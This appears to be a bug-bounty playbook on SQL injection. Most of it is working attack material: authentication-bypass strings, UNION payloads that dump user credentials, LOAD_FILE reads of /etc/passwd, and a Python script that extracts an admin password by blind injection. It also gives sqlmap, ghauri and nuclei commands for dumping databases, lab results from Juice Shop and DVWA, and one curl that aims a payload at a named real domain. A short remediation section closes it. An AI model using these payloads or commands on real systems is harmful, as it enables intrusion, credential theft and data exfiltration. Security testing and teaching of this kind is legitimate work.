# SQL Injection Playbook

**Category:** Injection
**Typical Severity:** High–Critical
**CVSS Range:** 7.5–10.0
**CWE:** CWE-89 (Improper Neutralization of Special Elements in SQL Commands)

---

## Overview

SQL injection in modern bug bounty programs is less common in core flows (most frameworks parameterize by default) but frequently found in:
- Legacy endpoints and v1 APIs that weren't refactored
- Search/filter parameters (especially `LIKE` queries)
- GraphQL resolvers with raw query building
- Admin panels and internal tools
- Second-order injection (data stored then used unsafely later)
- NoSQL injection (MongoDB, Elasticsearch — different syntax, same concept)

Even a single SQLi in a login endpoint is typically Critical. In modern apps, the most common modern form is **SQL injection in REST API filter/search parameters**.

---

## Real-World Impact

- **Authentication bypass**: `' OR 1=1--` on login endpoints
- **Credential dump**: UNION SELECT to extract all user hashes
- **PII exfiltration**: Dump customer database, emails, addresses
- **Privilege escalation**: Read admin credentials and take over accounts
- **Second-order**: Stored payloads triggered in admin panels
- **Blind SQLi → File Read**: `LOAD_FILE('/etc/passwd')` (MySQL, if privileges allow)
- **RCE**: `INTO OUTFILE` + webshell write, or `xp_cmdshell` (MSSQL)

---

## Recon Methodology

### Step 1 — Find injectable parameters

```bash
# Look for parameters in:
# - URL query strings: ?id=1&category=shoes&sort=price
# - Request bodies: {"search":"query","filter":"value"}
# - HTTP headers: X-Forwarded-For, User-Agent, Referer, Cookie values
# - GraphQL variables: {"query":"...","variables":{"id":1}}

# Identify all input points using Burp or mitmproxy
# Focus on: search, filter, sort, id, category, name, email, username parameters
```

### Step 2 — Test for error-based indicators

```bash
# Single quote to trigger a syntax error
curl "https://api.target.com/products?search=shoes'"
curl "https://api.target.com/products?category=men'"

# Look for:
# - 500 Internal Server Error (may indicate injection)
# - MySQL errors: "You have an error in your SQL syntax"
# - SQLite: "SQLite3::Exception"
# - MSSQL: "Unclosed quotation mark"
# - DB stack traces in response
```

### Step 3 — Confirm with boolean payloads

```bash
# True condition
curl "https://api.target.com/products?id=1 AND 1=1"
# False condition
curl "https://api.target.com/products?id=1 AND 1=2"

# If true returns data and false returns nothing → boolean SQLi confirmed
```

---

## Testing Methodology

### Test 1 — Error-Based SQLi

```bash
# MySQL
?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--+
?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

# MSSQL
?id=1' CONVERT(int, @@VERSION)--
?id=1'; SELECT 1/0--

# PostgreSQL
?id=1' AND 1=CAST(VERSION() AS int)--
```

### Test 2 — UNION-Based SQLi

```bash
# Step 1: Find number of columns
?search=x' ORDER BY 1--
?search=x' ORDER BY 2--
# Increment until error — column count is N-1

# Step 2: Find visible columns
?search=x' UNION SELECT NULL,NULL,NULL--
?search=x' UNION SELECT 'a',NULL,NULL--

# Step 3: Extract data
?search=x' UNION SELECT username,password,email FROM users--
?search=x' UNION SELECT user(),@@version,@@datadir--
```

### Test 3 — Blind Boolean SQLi

```bash
# True/false payloads to extract data character by character
?id=1 AND SUBSTRING(username,1,1)='a'
?id=1 AND ASCII(SUBSTRING(password,1,1))>64

# Python automation
python3 -c "
import requests
url = 'https://api.target.com/users'
charset = 'abcdefghijklmnopqrstuvwxyz0123456789@._-'
result = ''
for pos in range(1, 50):
    for c in charset:
        payload = f\"1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{c}'\"
        r = requests.get(url, params={'id': payload})
        if '<admin>' in r.text:  # true condition indicator
            result += c
            break
print(result)
"
```

### Test 4 — Time-Based Blind SQLi

```bash
# MySQL
?id=1' AND SLEEP(5)--
?id=1'; WAITFOR DELAY '0:0:5'--  # MSSQL
?id=1'; SELECT pg_sleep(5)--     # PostgreSQL

# If response takes 5 seconds → SQLi confirmed
time curl "https://api.target.com/users?id=1' AND SLEEP(5)--"
```

### Test 5 — GraphQL SQL Injection

```bash
# GraphQL variables are common injection points
curl -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter: \"x OR 1=1\") { id email } }"}'

# Hasura-specific (raw SQL in filter)
curl -X POST "https://kronor.io/v1/graphql" \
  -d '{"query":"{ payment_sessions(where: {id: {_eq: \"1 OR 1=1\"}}) { id amount } }"}'
```

### Test 6 — Second-Order SQLi

```bash
# Store payload in a field that is later used in an unsafe query
# Example: username field
POST /register
{"username": "admin'--", "password": "test"}

# Later, if the app does:
# SELECT * FROM users WHERE username = 'admin'--'
# The -- comments out the rest → auth bypass
```

---

## Common Endpoints to Test

| Parameter/Location | Likely Query |
|---|---|
| `?search=`, `?q=` | `WHERE name LIKE '%input%'` |
| `?id=`, `?user_id=` | `WHERE id = input` |
| `?category=`, `?sort=` | `ORDER BY input` or `WHERE category = input` |
| `/login` body | `WHERE username = input AND password = hash` |
| `/reset-password?token=` | `WHERE reset_token = input` |
| `User-Agent`, `X-Forwarded-For` | Logged to DB without sanitization |
| GraphQL variables | Raw query construction in resolvers |
| `?filter=`, `?where=` | ORM raw filter injection |

---

## Payload Examples

### Authentication Bypass

```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
' OR 'x'='x
') OR ('1'='1
" OR "1"="1
```

### UNION SELECT — Credential Dump

```sql
' UNION SELECT username,password,email,NULL FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### File Read (MySQL)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--
```

---

## Automation Ideas

```bash
# sqlmap — automated detection and exploitation
sqlmap -u "https://api.target.com/products?id=1" \
  -H "Authorization: Bearer <token>" \
  --level=3 --risk=2 --dbs

# sqlmap with POST request
sqlmap -u "https://api.target.com/login" \
  --data='{"username":"admin","password":"test"}' \
  --dbms=mysql --dump

# ghauri — modern sqlmap alternative
ghauri -u "https://api.target.com/search?q=shoes" --dbs

# nuclei SQLi templates
nuclei -u https://target.com -t sqli/ -H "Authorization: Bearer <token>"
```

---

## Real Bug Bounty Examples

### Example 1 — HackerOne (Numerous programs, $5,000–$50,000)
UNION-based SQLi in a REST API search endpoint. Dumped full user table including email and bcrypt hashes. Common finding in legacy e-commerce APIs.

### Example 2 — Shopify (Critical, ~$20,000)
Second-order SQL injection via the shop name field. Shop name was stored without sanitization and later used in an admin query, allowing full database dump.

### Example 3 — General Finding Pattern
`X-Forwarded-For` header logged to database without sanitization — extremely common in logging systems. Test: `X-Forwarded-For: 127.0.0.1', (SELECT SLEEP(5)), '`

---

## Lab / Program Examples

### OWASP Juice Shop — Lab Mission 2026-03-12-001 and 2026-03-12-002

**Source:** RedTeam mission artifacts `~/RedTeam/missions/juiceshop/`
**Severity:** CRITICAL (CVSS 9.8)

**Finding 1 — Authentication Bypass:**
`POST /rest/user/login` with body `{"email":"' OR 1=1--","password":"anything"}` returned a valid admin JWT. Classic `WHERE email = input` without parameterization.

**Finding 2 — UNION Credential Dump:**
`GET /rest/products/search?q=x' UNION SELECT id,email,password,role,NULL,NULL,NULL,NULL,NULL FROM Users--` returned all 22 user records including MD5-hashed passwords. The MD5 hashes were trivially crackable.

**Root cause:** Both endpoints used string concatenation to build SQL queries rather than parameterized queries. The Node.js/Sequelize ORM was bypassed by using raw query mode.

**Evidence:** `~/RedTeam/missions/juiceshop/2026-03-12-002/exploit/` and `timeline.log`

---

### DVWA — Lab Mission 2026-03-13-001

**Source:** RedTeam mission artifact `~/RedTeam/missions/dvwa/2026-03-13-001/`
**Severity:** CRITICAL

**Finding:** UNION-based SQLi on `/vulnerabilities/sqli/?id=` endpoint. Payload:
```
999' UNION SELECT user,password FROM users-- -
```
Returned MD5 hashes for: admin, gordonb, 1337, pablo, smithy.

Also confirmed OS command injection on `/vulnerabilities/exec/` (separate vector, see `path_traversal.md` for file read via command injection).

---

## Remediation

```python
# WRONG — string concatenation
query = f"SELECT * FROM users WHERE username = '{username}'"

# CORRECT — parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# CORRECT — ORM safe usage (Django)
User.objects.filter(username=username)  # auto-parameterized

# CORRECT — ORM raw query (still safe)
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])
```

For GraphQL (Hasura): use `_eq` operators with proper variable binding rather than raw SQL in `where` clauses.
